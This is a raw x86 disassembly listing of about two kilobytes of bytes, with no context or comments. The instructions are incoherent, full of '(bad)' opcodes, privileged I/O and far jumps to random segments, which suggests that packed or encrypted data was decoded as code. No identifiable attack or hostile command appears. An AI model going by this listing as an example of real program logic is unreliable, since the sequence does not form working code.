  4155e2:	jmp    0x415648
  4155e4:	imul   ebp,DWORD PTR [ebx+0x34c9a8eb],0xf919c3a1
  4155ee:	push   0xffffffe7
  4155f0:	cmp    cl,dl
  4155f2:	mov    BYTE PTR [esi-0x41],al
  4155f5:	push   0xffffffe3
  4155f7:	outs   dx,DWORD PTR ds:[esi]
  4155f8:	pop    esi
  4155f9:	and    edx,ebp
  4155fb:	repz push esi
  4155fd:	aam    0xea
  4155ff:	data16 sbb al,0xe9
  415602:	loop   0x415603
  415604:	xor    BYTE PTR [ecx],dh
  415606:	pop    eax
  415607:	xchg   ebx,eax
  415608:	int    0x83
  41560a:	jno    0x41566a
  41560c:	nop
  41560d:	jmp    0x7c6195f2
  415612:	es or  edi,DWORD PTR fs:[esi+0x5d]
  415617:	fwait
  415618:	arpl   WORD PTR [edi-0x75],dx
  41561b:	jl     0x4155cf
  41561d:	jmp    0xe9f5:0x736513d
  415624:	data16 mov bl,0x61
  415627:	mov    BYTE PTR [edi],bl
  415629:	(bad)
  41562c:	dec    esp
  41562d:	pop    ss
  41562e:	leave  
  41562f:	addr16 daa 
  415631:	jg     0x4155f7
  415633:	lods   eax,DWORD PTR ds:[esi]
  415634:	pop    ebp
  415635:	pop    eax
  415636:	out    0xff,eax
  415638:	adc    esi,DWORD PTR [ecx-0x7f]
  41563b:	dec    edx
  41563d:	outs   dx,DWORD PTR ds:[esi]
  41563e:	cmp    ebx,DWORD PTR [esi]
  415640:	imul   ebx,DWORD PTR [ebx],0x35
  415643:	and    edi,DWORD PTR [edx+0x5173c29]
  415649:	mov    ch,0x83
  41564b:	sbb    ecx,esi
  41564d:	lahf   
  41564e:	dec    ebx
  41564f:	stos   BYTE PTR es:[edi],al
  415650:	das    
  415651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415652:	mov    eax,0x4b45f0ef
  415657:	mov    ebp,0x89243aa0
  41565c:	ja     0x4156b2
  41565e:	or     al,0x53
  415660:	ret    
  415661:	xor    BYTE PTR [edi+0x45],bl
  415664:	jle    0x4156bf
  415666:	pop    edx
  415667:	gs jns 0x415634
  41566a:	mov    dl,ch
  41566c:	or     eax,0x1ca55d04
  415671:	je     0x41568c
  415673:	out    dx,eax
  415674:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415675:	ret    0xb194
  415678:	loope  0x415648
  41567a:	jno    0x415686
  41567c:	iret   
  41567d:	add    al,0x34
  41567f:	addr16 mov ds:0xac2f,eax
  415683:	jbe    0x4156da
  415685:	add    dh,bh
  415687:	popf   
  415688:	aaa    
  415689:	cld    
  41568a:	xlat   BYTE PTR ds:[ebx]
  41568b:	add    al,0xae
  41568d:	jl     0x4156a8
  41568f:	or     al,0xbc
  415691:	test   eax,0xc7e52195
  415696:	mov    ecx,0xaa22c7e8
  41569b:	mov    esi,0x16db3369
  4156a0:	push   ebp
  4156a1:	(bad)  
  4156a2:	cmp    BYTE PTR [eax+0x597fdb6f],ah
  4156a8:	leave  
  4156a9:	sti    
  4156aa:	push   ss
  4156ab:	adc    al,0x8c
  4156ad:	sbb    edx,esi
  4156af:	aaa    
  4156b0:	push   ebp
  4156b1:	sub    dl,BYTE PTR [ebx]
  4156b3:	out    0xa0,eax
  4156b5:	adc    ebp,DWORD PTR [ebx-0x7b]
  4156b8:	dec    bx
  4156ba:	mov    ds:0x3ddc58b1,al
  4156c0:	mov    BYTE PTR [eax+ebx*2+0xb],dh
  4156c4:	mov    BYTE PTR [ecx-0x79],bh
  4156c7:	push   ds
  4156c8:	mov    ebp,0x5651ec34
  4156cd:	test   BYTE PTR [eax+edi*4+0x2c],bl
  4156d1:	les    ecx,FWORD PTR [eax+ecx*4]
  4156d4:	ret    0xc0e0
  4156d7:	push   0x5609c80c
  4156dc:	mov    ebp,DWORD PTR [eax+0x7d]
  4156df:	push   edi
  4156e0:	les    edi,FWORD PTR [ecx-0x67]
  4156e3:	cmp    BYTE PTR [eax+edx*1-0x19],ch
  4156e7:	xor    dl,0xb5
  4156ea:	mov    al,ds:0x762e3e58
  4156ef:	mul    esi
  4156f1:	pop    ecx
  4156f2:	jnp    0x4156c6
  4156f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156f5:	stos   BYTE PTR es:[edi],al
  4156f6:	(bad)  
  4156f7:	lock out 0x62,al
  4156fa:	cdq    
  4156fb:	pusha  
  4156fc:	jle    0x415722
  4156fe:	xchg   ecx,esi
  415700:	xor    eax,0xddde5d06
  415705:	cld    
  415706:	cmp    DWORD PTR [esi+0x77],eax
  415709:	rol    DWORD PTR [ebx-0x6b],cl
  41570c:	inc    esi
  41570d:	aad    0x43
  41570f:	adc    BYTE PTR [ebx+0x47],dh
  415712:	test   ah,bh
  415714:	es nop
  415716:	adc    ah,BYTE PTR [ebx]
  415718:	inc    ecx
  415719:	mov    eax,DWORD PTR [ebx-0x6715b1bd]
  41571f:	cmp    ebx,ebx
  415721:	xchg   edi,eax
  415722:	(bad)  
  415723:	das    
  415724:	mov    cl,0xbe
  415726:	aad    0xf
  415728:	les    edi,FWORD PTR [edi]
  41572a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41572b:	cmc    
  41572c:	bound  esp,QWORD PTR [eax-0x7b0bd8f]
  415732:	iret   
  415733:	dec    ebx
  415734:	scas   eax,DWORD PTR es:[edi]
  415735:	sar    edx,1
  415737:	mov    BYTE PTR [ebp+0x5d7433c0],dl
  41573d:	aam    0xd3
  41573f:	loop   0x41570a
  415741:	push   ebp
  415742:	push   esp
  415743:	hlt    
  415744:	dec    ebp
  415745:	adc    edx,DWORD PTR [edi-0x6e]
  415748:	mov    ch,0x7d
  41574a:	sbb    al,0x59
  41574c:	sbb    DWORD PTR [ecx*2+0x633acbe5],esp
  415753:	pop    edi
  415754:	in     al,dx
  415755:	xor    edx,DWORD PTR [ebx+edi*1+0x1f]
  415759:	test   dh,bh
  41575b:	cmp    DWORD PTR [edx],0x4b
  41575e:	iret   
  41575f:	call   0xcce7447f
  415764:	rcl    DWORD PTR [ebp+0x5d],1
  415767:	add    dl,bh
  415769:	cmp    BYTE PTR [ecx+0x24ae2e38],ch
  41576f:	mov    al,BYTE PTR [esi-0x202cd063]
  415775:	jmp    0x4157a7
  415777:	pop    esp
  415778:	push   ss
  415779:	mov    bh,cl
  41577b:	fwait
  41577c:	(bad)  
  41577d:	call   0xb0dcd0f8
  415782:	jmp    0xd794dbec
  415787:	scas   eax,DWORD PTR es:[edi]
  415788:	lods   al,BYTE PTR cs:[esi]
  41578a:	lds    esp,FWORD PTR [esi+0x139a574]
  415790:	ss (bad) 
  415792:	jmp    0x415753
  415794:	call   0x63b2:0x87bd83b
  41579b:	xor    bl,bh
  41579d:	(bad)  
  41579e:	fld    QWORD PTR [ebp+ebx*4-0x68]
  4157a2:	dec    ecx
  4157a3:	out    dx,eax
  4157a4:	hlt    
  4157a5:	sahf   
  4157a6:	sub    ah,BYTE PTR [edx-0x63]
  4157a9:	dec    edx
  4157aa:	xor    DWORD PTR [esi+0x7ce51970],0x3c
  4157b1:	push   ebp
  4157b2:	jnp    0x4157c9
  4157b4:	out    0x2d,al
  4157b6:	pop    esi
  4157b7:	fstp   QWORD PTR [esi]
  4157b9:	and    BYTE PTR [esp+ecx*4],ch
  4157bc:	out    0xbb,eax
  4157be:	push   ss
  4157bf:	xchg   ecx,eax
  4157c0:	add    ecx,edi
  4157c2:	dec    ebx
  4157c3:	mov    dl,BYTE PTR [eax]
  4157c5:	cmp    edx,DWORD PTR [edi]
  4157c7:	lea    ebp,[eax]
  4157c9:	nop
  4157ca:	js     0x415835
  4157cc:	adc    BYTE PTR [edx+0x5550de36],bl
  4157d2:	std    
  4157d3:	rol    edx,0x2c
  4157d6:	stos   BYTE PTR es:[edi],al
  4157d7:	cmp    eax,0x86c7b754
  4157dc:	add    dl,bh
  4157de:	pop    esi
  4157df:	stc    
  4157e0:	mov    edx,0x79f58812
  4157e5:	add    ebx,DWORD PTR [ebx+eiz*2]
  4157e8:	mov    eax,0xb250dd40
  4157ed:	push   esi
  4157ee:	cdq    
  4157ef:	pushf  
  4157f0:	ja     0x4157ab
  4157f2:	mov    ch,0x64
  4157f4:	inc    ecx
  4157f5:	nop
  4157f6:	into   
  4157f7:	and    al,0xba
  4157f9:	push   edx
  4157fa:	xchg   ecx,eax
  4157fb:	jmp    0xf6c2:0x3cb0d847
  415802:	mov    eax,ds:0xbfe133ca
  415807:	test   DWORD PTR [edx+0x71f08c62],eax
  41580d:	dec    ebx
  41580e:	pop    ebx
  41580f:	adc    edi,DWORD PTR [ebp-0x35]
  415812:	adc    esp,DWORD PTR [ebx+0x3eaee681]
  415818:	jne    0x415813
  41581a:	fnstsw WORD PTR [esi]
  41581c:	out    0x59,eax
  41581e:	test   al,0x10
  415820:	pusha  
  415821:	inc    esi
  415822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415823:	test   al,0x55
  415825:	fld    DWORD PTR [edx]
  415827:	ins    BYTE PTR es:[edi],dx
  415828:	scas   al,BYTE PTR es:[edi]
  415829:	(bad)  
  41582a:	fild   QWORD PTR [edi-0x6b]
  41582d:	aad    0x58
  41582f:	or     BYTE PTR [edx+0x77],0x5f
  415833:	cdq    
  415834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415835:	rol    BYTE PTR [edx+0x5a],1
  415838:	enter  0xef0,0x4d
  41583c:	js     0x415840
  41583e:	or     ah,bl
  415840:	jg     0x41580a
  415842:	push   ebx
  415843:	cmc    
  415844:	fdiv   QWORD PTR [eax-0x1f966119]
  41584a:	pop    ebp
  41584b:	sub    al,dh
  41584d:	inc    eax
  41584e:	popa   
  41584f:	sbb    al,0x8a
  415851:	or     al,0x26
  415853:	sub    bh,BYTE PTR [eax-0x2c63c892]
  415859:	repz dec eax
  41585b:	cmp    DWORD PTR [edi-0x26ca5316],ecx
  415861:	or     eax,0x83092a19
  415866:	adc    ecx,esi
  415868:	inc    eax
  415869:	add    DWORD PTR [esp+edi*2],ecx
  41586c:	(bad)  
  41586d:	out    dx,eax
  41586e:	das    
  41586f:	clc    
  415870:	cs aaa 
  415872:	ss push ebx
  415874:	cmp    al,0xa6
  415876:	ret    
  415877:	jl     0x4158a0
  415879:	fwait
  41587a:	nop
  41587b:	dec    edi
  41587c:	push   ebx
  41587d:	retf   0x5982
  415880:	out    0xfa,eax
  415882:	pusha  
  415883:	iret   
  415884:	(bad)  
  415885:	add    al,0x52
  415887:	jp     0x41580f
  415889:	call   0x5637:0x43d60c0a
  415890:	call   0x7e01aa33
  415895:	je     0x4158fd
  415897:	push   ds
  415898:	or     BYTE PTR [edi],cl
  41589a:	aad    0x15
  41589c:	pop    ds
  41589d:	loop   0x4158c5
  41589f:	mov    al,ds:0x9d413d0b
  4158a4:	xchg   edx,eax
  4158a5:	pushf  
  4158a6:	mov    al,0x94
  4158a8:	inc    edi
  4158a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158aa:	pop    esi
  4158ab:	out    dx,eax
  4158ac:	and    ebx,0xa08c5fb9
  4158b2:	nop
  4158b3:	jae    0x41590e
  4158b5:	sbb    ebx,DWORD PTR [ebx-0x14]
  4158b8:	xor    BYTE PTR [edx-0x1a],dh
  4158bb:	mov    eax,0x1a2c18e
  4158c0:	pop    es
  4158c1:	mov    cl,0xe1
  4158c3:	out    dx,al
  4158c4:	cmp    DWORD PTR [ecx-0x61],esp
  4158c7:	and    esp,esi
  4158c9:	cmc    
  4158ca:	jg     0x41589e
  4158cc:	lods   eax,DWORD PTR ds:[esi]
  4158cd:	pop    esp
  4158ce:	pop    ss
  4158cf:	sub    esi,eax
  4158d1:	or     ebx,DWORD PTR [eax+0x55]
  4158d4:	shl    BYTE PTR [ebx],cl
  4158d6:	imul   eax,edi,0x27493f86
  4158dc:	add    al,0xd5
  4158de:	in     eax,0x52
  4158e0:	scas   eax,DWORD PTR es:[edi]
  4158e1:	jecxz  0x41586e
  4158e3:	jecxz  0x415873
  4158e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158e6:	lahf   
  4158e7:	pop    ebx
  4158e8:	cmp    cl,dl
  4158ea:	mov    al,ds:0x5d267ba4
  4158ef:	ss inc esp
  4158f1:	add    eax,0x81e4c5ba
  4158f6:	dec    ebx
  4158f7:	dec    ebp
  4158f8:	inc    edx
  4158f9:	mov    cs,ebx
  4158fb:	loope  0x4158a4
  4158fd:	pop    ss
  4158fe:	loope  0x41593b
  415900:	jp     0x4158c7
  415902:	mov    ?,WORD PTR [ecx-0x63]
  415905:	jge    0x415932
  415907:	ss retf 
  415909:	cmp    BYTE PTR [eax+0x3],bh
  41590c:	aad    0xed
  41590e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41590f:	(bad)  
  415910:	out    0x2c,al
  415912:	cld    
  415913:	xchg   ecx,eax
  415914:	jnp    0x415937
  415916:	xchg   DWORD PTR ds:0x7fbd5556,ebx
  41591c:	into   
  41591d:	in     al,dx
  41591e:	jno    0x415979
  415920:	daa    
  415921:	enter  0x4757,0x70
  415925:	xchg   edx,eax
  415926:	xchg   dh,cl
  415928:	sbb    BYTE PTR [edi+edx*8],bh
  41592b:	jge    0x4158f4
  41592d:	cmp    dh,bl
  41592f:	or     ch,BYTE PTR [ebp-0x4d26633e]
  415935:	sbb    eax,0x4baf53b9
  41593a:	mov    dl,0x17
  41593c:	jo     0x41593f
  41593e:	cmp    al,0xa3
  415940:	das    
  415941:	test   eax,0xa7e5dc7d
  415946:	lods   al,BYTE PTR ds:[esi]
  415947:	rol    BYTE PTR ds:0x94c56025,cl
  41594d:	mov    ds:0x7af62f4,eax
  415952:	pop    edx
  415953:	pop    ecx
  415954:	or     eax,0xfe1f7fa0
  415959:	add    eax,0xd9a75a35
  41595e:	cld    
  41595f:	pop    ss
  415960:	pop    ss
  415961:	cmp    BYTE PTR cs:[ecx-0x6a],dl
  415965:	mov    al,0xb5
  415967:	xchg   ebp,eax
  415968:	inc    edx
  415969:	ret    
  41596a:	js     0x4158f6
  41596c:	mov    dl,BYTE PTR [ebx-0x5f]
  41596f:	int    0x7
  415971:	xchg   ecx,eax
  415972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415973:	xchg   esi,eax
  415974:	popf   
  415975:	and    cl,cl
  415977:	fist   DWORD PTR [esi]
  415979:	retf   
  41597a:	or     BYTE PTR [edx],dh
  41597c:	clc    
  41597d:	dec    eax
  41597e:	xchg   BYTE PTR [edx-0x5f14faf0],bh
  415984:	outs   dx,DWORD PTR ds:[esi]
  415985:	lods   al,BYTE PTR ds:[esi]
  415986:	lds    esi,FWORD PTR [eax-0x595c08b1]
  41598c:	repz xor eax,0xd22b6540
  415992:	push   ds
  415993:	in     al,dx
  415994:	lods   eax,DWORD PTR ds:[esi]
  415995:	stos   DWORD PTR es:[edi],eax
  415996:	lock lock inc ebp
  415999:	mov    bl,0xd1
  41599b:	fisubr DWORD PTR [ebx]
  41599d:	fcmovnu st,st(4)
  41599f:	inc    ecx
  4159a0:	push   esi
  4159a1:	xchg   ebp,eax
  4159a2:	rcr    DWORD PTR [esi-0x4b66f4b],cl
  4159a8:	dec    edi
  4159a9:	call   0x3854:0x38a06a7a
  4159b0:	outs   dx,DWORD PTR ds:[esi]
  4159b1:	push   eax
  4159b2:	xchg   DWORD PTR [ecx-0x252914ee],ecx
  4159b8:	in     al,0x91
  4159ba:	cmp    DWORD PTR ss:[ecx-0x49],0xde17cf39
  4159c2:	rol    BYTE PTR ds:0x180dfca,0x20
  4159c9:	push   edi
  4159ca:	jle    0x4159ac
  4159cc:	jge    0x41596c
  4159ce:	inc    ebp
  4159cf:	mov    ecx,0x302f353f
  4159d4:	dec    eax
  4159d5:	or     eax,ecx
  4159d7:	retf   
  4159d8:	or     eax,0x6c5ae332
  4159dd:	div    DWORD PTR ds:0xe19a7e05
  4159e3:	and    dh,BYTE PTR [ebx+esi*4]
  4159e6:	inc    eax
  4159e7:	pop    eax
  4159e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e9:	sahf   
  4159ea:	lea    ebp,[ebx]
  4159ec:	into   
  4159ed:	push   esi
  4159ee:	mov    eax,ds:0x7db688c3
  4159f3:	cld    
  4159f4:	mov    bl,0x16
  4159f6:	das    
  4159f7:	rol    DWORD PTR [edx],1
  4159f9:	inc    eax
  4159fa:	dec    ebp
  4159fb:	mov    dl,0x35
  4159fd:	ds loopne 0x4159ab
  415a00:	rcl    esp,0x22
  415a03:	adc    DWORD PTR [ebp-0x88b9d73],edx
  415a09:	mov    ebx,ebp
  415a0b:	jae    0x4159dd
  415a0d:	ins    DWORD PTR es:[edi],dx
  415a0e:	jne    0x4159ee
  415a10:	out    0x3,eax
  415a12:	xchg   ah,al
  415a14:	sub    esp,DWORD PTR [ecx+0x191e5ebc]
  415a1a:	and    esp,edi
  415a1c:	sbb    eax,0x54eba11a
  415a21:	add    BYTE PTR [esi],bh
  415a23:	jae    0x415a02
  415a25:	xor    al,0x9
  415a27:	adc    eax,0x381ab2f9
  415a2c:	xor    eax,0x61023298
  415a31:	cmp    eax,0x5962eb4c
  415a36:	and    BYTE PTR [ecx-0x36a5da01],bl
  415a3c:	cmc    
  415a3d:	js     0x4159f0
  415a3f:	and    ebp,esi
  415a41:	aam    0xe9
  415a43:	icebp  
  415a44:	push   esp
  415a45:	(bad)  
  415a46:	push   0x61019152
  415a4b:	fcom   DWORD PTR [ebx+0x17619abd]
  415a51:	clc    
  415a52:	mov    bl,0x2a
  415a54:	push   esi
  415a55:	out    dx,eax
  415a56:	in     eax,0x49
  415a58:	ds neg edx
  415a5b:	and    DWORD PTR [ebx+eax*8-0x5fc46f17],0x62ca9b72
  415a66:	mov    ebx,0x1dba5fc1
  415a6b:	add    dl,0xcf
  415a6e:	push   cs
  415a6f:	ret    0xe4f3
  415a72:	das    
  415a73:	addr16 xor ebp,esp
  415a76:	jo     0x415a47
  415a78:	in     eax,dx
  415a79:	imul   ecx,DWORD PTR ds:0x48f775aa,0x9b568a5f
  415a83:	pop    edx
  415a84:	(bad)  
  415a85:	mov    ch,0xa6
  415a87:	mov    esi,0xe78695aa
  415a8c:	test   eax,0xcc6ce9d7
  415a91:	dec    edi
  415a92:	repnz mov ch,0x61
  415a95:	lds    ecx,FWORD PTR [eax+0xb22de24]
  415a9b:	test   dh,0xd2
  415a9e:	cld    
  415a9f:	xor    DWORD PTR [eax],ebx
  415aa1:	add    al,0xcd
  415aa3:	outs   dx,DWORD PTR ds:[esi]
  415aa4:	lds    edi,FWORD PTR [edx+0x6cd94e18]
  415aaa:	ret    0xd196
  415aad:	pop    eax
  415aae:	fimul  WORD PTR [edx-0x31]
  415ab1:	dec    DWORD PTR [esi+0x22]
  415ab4:	or     eax,0x2fe6bfeb
  415ab9:	and    BYTE PTR [edx],dh
  415abb:	cmc    
  415abc:	retf   
  415abd:	add    BYTE PTR [edx+0x28852b23],0x2b
  415ac4:	clc    
  415ac5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ac6:	cwde   
  415ac7:	mov    eax,ds:0x9d6cb88b
  415acc:	lods   eax,DWORD PTR ds:[esi]
  415acd:	push   es
  415ace:	mov    eax,0x52a8a81
  415ad3:	adc    al,0x26
  415ad5:	loope  0x415b43
  415ad7:	cmp    BYTE PTR [ecx],dh
  415ad9:	dec    esi
  415ada:	icebp  
  415adb:	cli    
  415adc:	adc    BYTE PTR [edx],dh
  415ade:	xchg   sp,ax
  415ae0:	push   0x3e9b2393
  415ae5:	mov    ah,0xce
  415ae7:	call   0x2a37:0xae00f6a1
  415aee:	sbb    edx,DWORD PTR [eax+eax*1-0x64]
  415af2:	mov    eax,0x25dcd621
  415af7:	or     eax,0xf30bdf70
  415afc:	in     eax,dx
  415afd:	das    
  415afe:	jl     0x415aa8
  415b00:	daa    
  415b01:	push   eax
  415b02:	and    al,0x97
  415b04:	dec    BYTE PTR [edx]
  415b06:	inc    edi
  415b07:	fwait
  415b08:	cs rcl ah,1
  415b0b:	jmp    0xbdbdc4c4
  415b10:	jae    0x415b8e
  415b12:	add    dh,BYTE PTR [ebx+0x2d]
  415b15:	adc    al,0xda
  415b17:	ins    BYTE PTR es:[edi],dx
  415b18:	adc    eax,0x2acdc0ec
  415b1d:	jecxz  0x415ac1
  415b1f:	sbb    esi,DWORD PTR [esi]
  415b21:	push   ds
  415b22:	inc    esp
  415b23:	jecxz  0x415b78
  415b25:	adc    DWORD PTR [ebx],esi
  415b27:	fstp   TBYTE PTR [edi-0x68]
  415b2a:	xchg   ebx,eax
  415b2b:	mov    ss,WORD PTR [edi]
  415b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b2e:	adc    al,0x50
  415b30:	sub    DWORD PTR [eax-0x3e9d4aa1],ecx
  415b36:	int    0x34
  415b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b39:	ins    DWORD PTR es:[edi],dx
  415b3a:	push   edi
  415b3b:	(bad)  
  415b3c:	and    bl,dh
  415b3e:	or     DWORD PTR [esi+0x2d],0x9ab719e7
  415b45:	push   ebp
  415b46:	pusha  
  415b47:	push   edi
  415b48:	xchg   edx,eax
  415b49:	pop    eax
  415b4a:	sub    DWORD PTR [ebx],ebx
  415b4c:	stc    
  415b4d:	fs jl  0x415bb4
  415b50:	into   
  415b51:	jge    0x415b56
  415b53:	test   cl,0xc
  415b56:	(bad)  
  415b57:	popa   
  415b58:	pop    es
  415b59:	loope  0x415b06
  415b5b:	dec    ecx
  415b5c:	shr    BYTE PTR ds:[edx-0x5b9788d],cl
  415b63:	jmp    0x415ae6
  415b65:	pushf  
  415b66:	popa   
  415b67:	mov    esp,0x18d7246a
  415b6c:	xchg   ecx,eax
  415b6d:	(bad)  
  415b6e:	sub    eax,0xfb873584
  415b73:	ins    BYTE PTR es:[edi],dx
  415b74:	xor    BYTE PTR [edx],cl
  415b76:	mov    ds,eax
  415b78:	sbb    bh,ch
  415b7a:	cdq    
  415b7b:	dec    esp
  415b7c:	pop    edi
  415b7d:	xchg   edi,eax
  415b7e:	or     al,0x82
  415b80:	loope  0x415b7a
  415b82:	jnp    0x415bab
  415b84:	mov    ah,0x3b
  415b86:	push   ss
  415b87:	out    0x61,al
  415b89:	call   0xf8f6:0x2cfe56da
  415b90:	pushf  
  415b91:	(bad)  
  415b92:	adc    eax,0xe0aa7eb
  415b97:	mov    esi,0x20b09e28
  415b9c:	or     ecx,DWORD PTR [esi]
  415b9e:	pop    ecx
  415b9f:	daa    
  415ba0:	push   0xcf2e0db9
  415ba5:	mov    ebx,0xfe57152b
  415baa:	cmp    esp,ebx
  415bac:	xor    dh,BYTE PTR [esi]
  415bae:	pop    ebp
  415baf:	cmp    eax,0xea422380
  415bb4:	inc    esi
  415bb5:	cmp    BYTE PTR [edi],cl
  415bb7:	cmc    
  415bb8:	inc    DWORD PTR [edx-0x585dd639]
  415bbe:	xchg   esi,eax
  415bbf:	mov    ebx,0x72736efd
  415bc4:	mov    ebx,0x836f1d2b
  415bc9:	nop
  415bca:	mov    ecx,0x28436cc1
  415bcf:	pusha  
  415bd0:	das    
  415bd1:	fadd   DWORD PTR [edi+0x3ec61afc]
  415bd7:	xor    eax,DWORD PTR [esi]
  415bd9:	ja     0x415c16
  415bdb:	mov    edx,0x8314a456
  415be0:	arpl   bx,sp
  415be2:	ret    0x1409
  415be5:	outs   dx,BYTE PTR ds:[esi]
  415be6:	dec    edx
  415be7:	and    eax,0xaac2d91e
  415bec:	cmp    al,0x39
  415bee:	cmp    eax,0xbbaf52c8
  415bf3:	or     DWORD PTR [ebx],ecx
  415bf5:	test   eax,0xecc72242
  415bfa:	out    0x64,eax
  415bfc:	mov    ah,0x57
  415bfe:	in     eax,0x6
  415c00:	jg     0x415ba8
  415c02:	add    BYTE PTR [ebx+0x6],0xf6
  415c06:	adc    edx,ebp
  415c08:	push   edi
  415c09:	mov    bh,0xa7
  415c0b:	arpl   WORD PTR [ebx],dx
  415c0d:	cmp    ah,BYTE PTR [edi+0x53b2d759]
  415c13:	lahf   
  415c14:	or     eax,0xa56f10bc
  415c19:	inc    edx
  415c1a:	ja     0x415bc2
  415c1c:	or     BYTE PTR [edi-0x58bf4045],cl
  415c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c23:	sbb    DWORD PTR [ecx+eax*4+0x63],ebp
  415c27:	push   edi
  415c28:	in     eax,dx
  415c29:	scas   al,BYTE PTR es:[edi]
  415c2a:	push   ecx
  415c2b:	pop    DWORD PTR [esi+0x13]
  415c2e:	lds    edx,FWORD PTR [edi+edi*2-0x75129180]
  415c35:	and    al,0xc9
  415c37:	ins    DWORD PTR es:[edi],dx
  415c38:	mov    eax,0x1d866954
  415c3d:	add    al,0xa2
  415c3f:	in     eax,0x34
  415c41:	push   cs
  415c42:	xor    BYTE PTR [ebp+0x5e78204f],al
  415c48:	stos   BYTE PTR es:[edi],al
  415c49:	fild   WORD PTR [edi+0x6f64d3cc]
  415c4f:	je     0x415c0b
  415c51:	mov    eax,ds:0x700f5480
  415c56:	or     DWORD PTR [ecx-0x468c11bd],edx
  415c5c:	retf   
  415c5d:	xbegin 0xab1e1340
  415c63:	sub    BYTE PTR cs:[edx-0x56467177],0xb8
  415c6b:	mov    WORD PTR [ecx+0x5f],?
  415c6e:	aaa    
  415c6f:	sub    BYTE PTR [edx+0x45],al
  415c72:	lahf   
  415c73:	pop    ebp
  415c74:	add    esi,DWORD PTR [eax+0x7a]
  415c77:	jg     0x415cf8
  415c79:	ins    DWORD PTR es:[edi],dx
  415c7a:	(bad)  
  415c7b:	xor    BYTE PTR [ecx+0x9],cl
  415c7e:	les    edx,FWORD PTR [ebx]
  415c80:	dec    edi
  415c81:	mov    al,0x93
  415c83:	call   0x3f1ce5bb
  415c88:	ss inc ebx
  415c8a:	div    edi
  415c8c:	adc    eax,0xec50fc43
  415c91:	mov    ds:0xdc436ec,al
  415c96:	mov    ecx,0x13319ddc
  415c9b:	test   al,0x3c
  415c9d:	in     eax,dx
  415c9e:	(bad)  
  415c9f:	mov    bh,0x83
  415ca1:	cdq    
  415ca2:	shl    cl,0x32
  415ca5:	fadd   DWORD PTR [ebp+0x2128f61a]
  415cab:	pop    ebx
  415cac:	jl     0x415c74
  415cae:	lods   eax,DWORD PTR ds:[esi]
  415caf:	clc    
  415cb0:	retf   0x190f
  415cb3:	les    esi,FWORD PTR [ebp+0x4281a068]
  415cb9:	mov    ds:0x3dac463e,eax
  415cbe:	loopne 0x415c4e
  415cc0:	stos   DWORD PTR es:[edi],eax
  415cc1:	and    BYTE PTR [ebx],ch
  415cc3:	xor    DWORD PTR [ecx-0x2b],eax
  415cc6:	xchg   esp,eax
  415cc7:	push   ecx
  415cc8:	add    BYTE PTR [eax],ch
  415cca:	sahf   
  415ccb:	xchg   DWORD PTR [edx+ebp*2-0x2520128d],ebx
  415cd2:	cmp    BYTE PTR [ebp+0x314c78fa],ch
  415cd8:	call   0xd87331e2
  415cdd:	mov    esi,edx
  415cdf:	adc    al,0x80
  415ce1:	xchg   esi,eax
  415ce2:	inc    esi
  415ce3:	pushf  
  415ce4:	dec    edi
  415ce5:	or     DWORD PTR [edx+esi*4],edx
  415ce8:	stc    
  415ce9:	popf   
  415cea:	cmovle ebx,DWORD PTR [ebp+0x57]
  415cee:	push   eax
  415cef:	aaa    
  415cf0:	add    al,0x36
  415cf2:	xor    BYTE PTR [eax-0x45abbcfe],cl
  415cf8:	(bad)  
  415cf9:	cld    
  415cfa:	push   ebp
  415cfb:	stos   BYTE PTR es:[edi],al
  415cfc:	add    BYTE PTR [esi+0x55701ad7],cl
  415d02:	and    eax,esi
  415d04:	add    DWORD PTR [ebx+esi*2+0x11],eax
  415d08:	sbb    eax,0xeb50da7b
  415d0d:	dec    eax
  415d0e:	stc    
  415d0f:	call   0xdab17b3f
  415d14:	std    
  415d15:	clc    
  415d16:	push   es
  415d17:	fcom   QWORD PTR [esp+eax*1+0x471d6dd2]
  415d1e:	sti    
  415d1f:	loop   0x415d26
  415d21:	fisub  DWORD PTR [ebp+0x3ea9267d]
  415d27:	popf   
  415d28:	sub    dh,0xa1
  415d2b:	mov    ebp,0x6880ce8a
  415d30:	and    al,0x9d
  415d32:	adc    cl,BYTE PTR [edx]
  415d34:	push   edx
  415d35:	pop    eax
  415d36:	lea    ebx,[eax-0x31]
  415d39:	xchg   ebx,eax
  415d3a:	pop    ss
  415d3b:	(bad)  
  415d3c:	fild   WORD PTR [eax+0x5f0cbf0d]
  415d42:	adc    al,BYTE PTR [ecx+eax*2+0x4130f759]
  415d49:	adc    al,0xda
  415d4b:	pop    ebp
  415d4c:	ror    BYTE PTR [esi-0x6c1deba9],0xed
  415d53:	or     DWORD PTR ds:0x7278b76c,0xffffffc8
  415d5a:	pop    esi
  415d5b:	pop    ds
  415d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d5d:	mov    eax,ds:0x62fb8f79
  415d62:	pushf  
  415d63:	jge    0x415d12
  415d65:	call   0x4626:0x6c968b78
  415d6c:	rcl    DWORD PTR [eax],0xf0
  415d6f:	push   0x912a21e9
  415d74:	push   edi
  415d75:	pushf  
  415d76:	mov    edx,ebx
  415d78:	les    eax,FWORD PTR [ebx+0x24e5c524]
  415d7e:	jmp    0x3bae:0x7b7dd34c
  415d85:	adc    dl,al
  415d87:	and    bl,BYTE PTR [edi+0x52]
  415d8a:	inc    esp
  415d8b:	aam    0x48
  415d8d:	cmp    al,0x16
  415d8f:	mov    edi,0x92146251
  415d94:	repnz fbld TBYTE PTR [ebp-0x2]
  415d98:	push   esp
  415d99:	inc    ebx
  415d9a:	push   ebp
  415d9b:	ret    0x54db
